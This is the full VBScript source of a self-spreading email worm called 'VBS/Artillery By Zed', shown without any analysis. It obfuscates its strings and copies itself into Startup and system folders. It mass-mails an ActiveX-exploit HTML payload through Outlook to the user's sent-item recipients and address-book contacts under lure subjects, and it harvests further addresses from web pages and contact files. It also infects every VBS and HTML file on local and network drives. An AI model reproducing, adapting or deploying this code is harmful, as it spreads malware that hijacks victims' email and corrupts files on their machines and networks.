'VBS/Artillery By Zed
On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")
Set wsc = CreateObject("WScript.Shell")
OlkCode = Chr(34) & Chr(79) & Chr(117) & Chr(116) & Chr(108) _
& Chr(111) & Chr(111) & Chr(107) & Chr(46) & Chr(65) _
& Chr(112) & Chr(112) & Chr(108) & Chr(105) _
& Chr(99) & Chr(97) & Chr(116) _
& Chr(105) & Chr(111) _
& Chr(110) & Chr(34)
Execute "Set OlkApp = CreateObject(" & OlkCode & ")"
StartDir = BreakFolder(wsc.SpecialFolders("Startup"))
WinDir = BreakFolder(fso.GetSpecialFolder(0))
SysDir = BreakFolder(fso.GetSpecialFolder(1))
FCopy StartDir & "\Winwsh32.vbs", 2
FCopy WinDir & "\Login32.vbs", 0
FCopy SysDir & "\Winmsgc32.vbs", 0
FCopy WinDir & "\Winmsgc.vbe", 2
FCopy SysDir & "\Winmsgc.vbe", 2
RegSoftwareKey = Chr(72) & Chr(75) & Chr(67) & Chr(85) _
& Chr(92) & Chr(83) & Chr(111) & Chr(102) & Chr(116) _
& Chr(119) & Chr(97) & Chr(114) & Chr(101) & Chr(92) _
& Chr(90) & Chr(101) & Chr(100) & Chr(92) & Chr(65) _
& Chr(114) & Chr(116) & Chr(105) & Chr(108) _
& Chr(108) & Chr(101) & Chr(114) & Chr(121)
If OlkApp <> "" Then
OlkInstalled = True
CreateExpCode WinDir & "\Winhtm32.html"
Else
OlkInstalled = False
End If
Set otf = fso.OpenTextFile(WScript.ScriptFullName, 1)
ra = otf.ReadAll
otf.Close
For CLoop = 1 To Len(ra)
Char = Mid(ra, CLoop, 1)
If Char = Chr(34) Then
Char = Char & Chr(34)
End If
If Char = Chr(13) Then
Char = Chr(34) & " & vbCrLf & " & Chr(34)
End If
If Char = Chr(10) Then
Char = ""
End If
If Char = Chr(47) Then
Char = Chr(34) & " & Chr(47) & " & Chr(34)
End If
TXTMod = TXTMod & Char
Next
ExecCode = Chr(99) & Chr(111) & Chr(109) _
& Chr(46) & Chr(109) & Chr(115) _
& Chr(46) & Chr(97) & Chr(99) _
& Chr(116) & Chr(105) & Chr(118) _
& Chr(101) & Chr(88) & Chr(46) _
& Chr(65) & Chr(99) & Chr(116) _
& Chr(105) & Chr(118) & Chr(101) _
& Chr(88) & Chr(67) & Chr(111) _
& Chr(109) & Chr(112) & Chr(111) _
& Chr(110) & Chr(101) & Chr(110) & Chr(116)
ExploitCode = "<APPLET HEIGHT=0 WIDTH=0 code=" & ExecCode & "></APPLET>" & vbCrLf _
& "<Script Language = JAVASCRIPT>" & vbCrLf _
& "// VBS/Artillery by Zed" & vbCrLf _
& "function WriteExploit(){" & vbCrLf _
& "CreateObj = document.applets[0];" & vbCrLf _
& "CreateObj.setCLSID(""{0D43FE01-F093-11CF-8940-00A0C9054228}"");" & vbCrLf _
& "CreateObj.createInstance();" & vbCrLf _
& "fso = CreateObj.GetObject();" & vbCrLf _
& "CreateObj.setCLSID(""{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}"");" & vbCrLf _
& "CreateObj.createInstance();" & vbCrLf _
& "wsc = CreateObj.GetObject();" & vbCrLf _
& "var WriteCode = fso.CreateTextFile(wsc.SpecialFolders(""Startup"") + ""\\Winwsh32.vbs"", 1);" & vbCrLf _
& "WriteCode.Write (WormCode);" & vbCrLf _
& "WriteCode.Close();" & vbCrLf _
& "}" & vbCrLf _
& "setTimeout(""WriteExploit()"", 1000);" & vbCrLf _
& "</Script>" & vbCrLf _
& "<Script Language = VBSCRIPT>" & vbCrLf _
& "On Error Resume Next" & vbCrLf _
& "WormCode = " & Chr(34) & TXTMod & Chr(34) & vbCrLf _
& "// VBS/Artillery by Zed" & vbCrLf _
& "</Script>"
If OlkInstalled = True Then
Map = Chr(34) & Chr(77) & Chr(65) & Chr(80) & Chr(73) & Chr(34)
Execute "Set GNS = OlkApp.GetNameSpace(" & Map & ")"
For EN1 = 1 To GNS.GetDefaultFolder(4).Items.Count
EmlSwitch = 1
Set OE2 = OlkApp.CreateItem(0)
Set EmailMsg = GNS.GetDefaultFolder(4).Items.Item(EmlSwitch)
If EmailMsg.To <> "" Then OE2.To = EmailMsg.To
If EmailMsg.CC <> "" Then OE2.CC = EmailMsg.CC
If EmailMsg.BCC <> "" Then OE2.BCC = EmailMsg.BCC
OE2.Subject = EmailMsg.Subject
OE2.HTMLBody = ExploitCode
OE2.Importance = EmailMsg.Importance
OE2.Attachments.Add WinDir & "\Winhtm32.html"
OE2.DeleteAfterSubmit = True
OE2.Send
GNS.GetDefaultFolder(4).Items.Remove EmlSwitch
EmlSwitch = EmlSwitch + 1
Next
AddyLst = Chr(65) & Chr(100) & Chr(100) & Chr(114) _
& Chr(101) & Chr(115) & Chr(115) _
& Chr(76) & Chr(105) & Chr(115) _
& Chr(116) & Chr(115)
AddyEnt = Chr(65) & Chr(100) & Chr(100) _
& Chr(114) & Chr(101) & Chr(115) & Chr(115) _
& Chr(69) & Chr(110) & Chr(116) _
& Chr(114) & Chr(105) _
& Chr(101) & Chr(115)
Execute "Set Adlst = GNS." & AddyLst
For Each ContactSwitch In Adlst
Execute "Set adyent = ContactSwitch." & AddyEnt
For UserGroup = 1 To adyent.Count
SendEmail adyent(UserGroup)
Next
Next
End If
For Each MappedDrive In fso.Drives
If MappedDrive.DriveType = 2 Or MappedDrive.DriveType = 3 Then
If MappedDrive.IsReady Then
PCFolderSeek BreakFolder(MappedDrive.Path) & "\"
End If
End If
Next
Function PCFolderSeek(FPath)
On Error Resume Next
For Each PCFolder In fso.GetFolder(FPath).SubFolders
PCFileSeek PCFolder.Path
PCFolderSeek PCFolder.Path
Next
End Function
Function PCFileSeek(FPath)
On Error Resume Next
For Each PCFile In fso.GetFolder(FPath).Files
FileExt = LCase(fso.GetExtensionName(PCFile.Path))
If FileExt = "htm" Or FileExt = "html" Then
If OlkInstalled = True Then
FindEmail PCFile.Path
End If
HTMWrite PCFile.Path
End If
If FileExt = "ctt" Then
If OlkInstalled = True Then
FindCTTEmail PCFile.Path
End If
End If
If FileExt = "vbs" Or FileExt = "vbs" Then
VBSAppend PCFile.Path
End If
Next
End Function
Function FindEmail(HTPath)
On Error Resume Next
Set OpenHTFile = fso.OpenTextFile(HTPath, 1)
HTCode = OpenHTFile.ReadAll
OpenHTFile.Close
MailtoStr = InStr(1, LCase(HTCode), "mailto:")
If MailtoStr <> 0 Then
HTSplitLine = Split(HTCode, vbCrLf)
For Each HTLineSrc In HTSplitLine
MailToLine = InStr(1, LCase(HTLineSrc), "mailto:")
If MailToLine <> 0 Then
DelBeforeMailto = Right(HTLineSrc, Len(HTLineSrc) - MailToLine - 6)
For CLoop = 1 To Len(DelBeforeMailto)
EmlChr = Mid(DelBeforeMailto, CLoop, 1)
If EmlChr = Chr(34) Or EmlChr = "'" _
Or EmlChr = "<" _
Or EmlChr = "?" Or EmlChr = ">" _
Or EmlChr = Chr(32) _
Or EmlChr = "[" _
Or EmlChr = "]" Then
Exit For
End If
EmailStr = EmailStr & EmlChr
Next
If EmailStr <> "" Then
If Len(EmailStr) < 50 Then
If InStr(1, EmailStr, "@") <> 0 Then
If InStr(1, EmailStr, ".") <> 0 Then
SendEmail EmailStr
EmailStr = ""
End If
End If
End If
End If
End If
Next
End If
End Function
Function FindCTTEmail(CTTFile)
On Error Resume Next
Set OpenCTT = fso.OpenTextFile(CTTFile, 1)
CTTSource = OpenCTT.ReadAll
OpenCTT.Close
SplitSrc = Split(CTTSource, vbCrLf)
For Each SrcLine In SplitSrc
StartStr = InStr(1, LCase(SrcLine), "<contact>")
EndStr = InStr(1, LCase(SrcLine), "</contact>")
If StartStr <> 0 And EndStr <> 0 Then
CharCount = 0
For CLoop = 1 To Len(SrcLine)
CharCount = CharCount + 1
If Mid(SrcLine, CLoop, 1) = ">" Then Exit For
Next
RtBreak = Right(SrcLine, Len(SrcLine) - CharCount)
For KL1 = 1 To Len(RtBreak)
LtBreak = Left(RtBreak, KL1)
If Right(LtBreak, 1) = "<" Then Exit For
Next
CTTEmailStr = Left(LtBreak, Len(LtBreak) - 1)
If InStr(1, CTTEmailStr, "@") <> 0 Then
If InStr(1, CTTEmailStr, ".") <> 0 Then
SendEmail CTTEmailStr
End If
End If
End If
Next
End Function
Function SendEmail(EmailAddress)
On Error Resume Next
If OlkInstalled = True Then
RegEmailKey = RegSoftwareKey & "\EmailIndex\" & EmailAddress
CheckIfSent = wsc.RegRead(RegEmailKey)
If CheckIfSent = "" Then
Randomize
Select Case Int((19 * Rnd) + 1)
Case 1: RndSubj = "Nothing special"
Case 2: RndSubj = "Uninstall information"
Case 3: RndSubj = "Password confirmation"
Case 4: RndSubj = "Notice"
Case 5: RndSubj = "Re:"
Case 6: RndSubj = "Some news"
Case 7: RndSubj = "Hello"
Case 8: RndSubj = "MP3s"
Case 9: RndSubj = "Just a reply"
Case 10: RndSubj = "Email changes"
Case 11: RndSubj = "Reminder"
Case 12: RndSubj = "File backup"
Case 13: RndSubj = "Webpage builder"
Case 14: RndSubj = "Some documents"
Case 15: RndSubj = "Jokes"
Case 16
RW16 = Array("sign up", "login", _
"email", "download", "password", _
"domain", "document", "spreadsheet", _
"file", "webpage")
Randomize
RndSubj = "New " & RW16(Int(9 * Rnd))
Case 17: RndSubj = "Some notes"
Case 18
RW18 = Array("Email", "Business", "Web", _
"Confidential", "Printer", "Webpage")
RW28 = Array("passwords", "files", "documents", _
"spreadsheets", "folders", "notes", "tools", _
"guides", "scripts", "summary", "overview")
Randomize
Randomize
RndSubj = RW18(Int(5 * Rnd)) _
& Chr(32) & RW28(Int(10 * Rnd))
Case 19: RndSubj = "Backup data"
End Select
Set OlkEml = OlkApp.CreateItem(0)
OlkEml.To = EmailAddress
OlkEml.Subject = RndSubj
OlkEml.HTMLBody = ExploitCode
OlkEml.Attachments.Add WinDir & "\Winhtm32.html"
OlkEml.DeleteAfterSubmit = True
OlkEml.Send
wsc.RegWrite RegEmailKey, "Email sent - " & TimeValue(Now)
End If
End If
End Function
Function VBSAppend(VBSFile)
On Error Resume Next
Set OpenVBSFile = fso.OpenTextFile(VBSFile, 1)
VBSFileSrc = OpenVBSFile.ReadAll
OpenVBSFile.Close
WormTag = "'VBS/Artillery By Zed"
If InStr(1, VBSFileSrc, WormTag) = 0 Then
Set WriteVBSFile = fso.OpenTextFile(VBSFile, 8)
WriteVBSFile.WriteBlankLines(9)
WriteVBSFile.Write WormTag & vbCrLf _
& "Set FSOobj123 = CreateObject(""Scripting.FileSystemObject"")" & vbCrLf _
& "Set WSCobj123 = CreateObject(""WScript.Shell"")" & vbCrLf _
& "WCodeFile123 = WSCobj123.SpecialFolders(""Startup"") & ""\Winwsh32.vbs""" & vbCrLf _
& "Set WriteWCode123 = FSOobj123.CreateTextFile(WCodeFile123, True)" & vbCrLf _
& "WriteWCode123.Write " & Chr(34) & TXTMod & Chr(34) & vbCrLf _
& "WriteWCode123.Close" & vbCrLf _
& "If FSOobj123.FileExists(WCodeFile123) Then" & vbCrLf _
& "FSOobj123.GetFile(WCodeFile123).Attributes = 2" & vbCrLf _
& "End If" & vbCrLf _
& WormTag
WriteVBSFile.Close
End If
End Function
Function HTMWrite(HTMPath)
On Error Resume Next
Set OpenHTMFile = fso.OpenTextFile(HTMPath, 1)
HTMFileSrc = OpenHTMFile.ReadAll
OpenHTMFile.Close
If InStr(1, HTMFileSrc, "// VBS/Artillery by Zed") = 0 Then
FoundCode = InStr(1, LCase(HTMFileSrc), "<body")
If FoundCode <> 0 Then
BreakHTMLines = Split(HTMFileSrc, vbCrLf)
For Each HTMSrcLine In BreakHTMLines
If InStr(1, LCase(HTMSrcLine), "<body") <> 0 _
And InStr(1, HTMSrcLine, vbCrLf) = 0 Then
If InStr(1, HTMSrcLine, "<") <> 0 _
And InStr(1, HTMSrcLine, ">") <> 0 Then
NewHTMCode = Replace(HTMFileSrc, _
HTMSrcLine, HTMSrcLine _
& vbCrLf & ExploitCode & vbCrLf)
Set WriteHTMFile = fso.OpenTextFile(HTMPath, 2)
WriteHTMFile.Write NewHTMCode
WriteHTMFile.Close
Exit For
End If
End If
Next
End If
End If
End Function
Function BreakFolder(TextStr)
On Error Resume Next
If Right(TextStr, 1) = "\" Then
BreakFolder = Left(TextStr, Len(TextStr) - 1)
Else
BreakFolder = TextStr
End If
End Function
Function CreateExpCode(ExpPath)
On Error Resume Next
Set Write1Exp = fso.CreateTextFile(ExpPath, True)
Write1Exp.Write ExploitCode
Write1Exp.Close
End Function
Function FCopy(FPath, FAttributes)
On Error Resume Next
fso.CopyFile WScript.ScriptFullName, FPath
If fso.FileExists(FPath) Then
fso.GetFile(FPath).Attributes = FAttributes
End If
End Function
'VBS/Artillery By Zed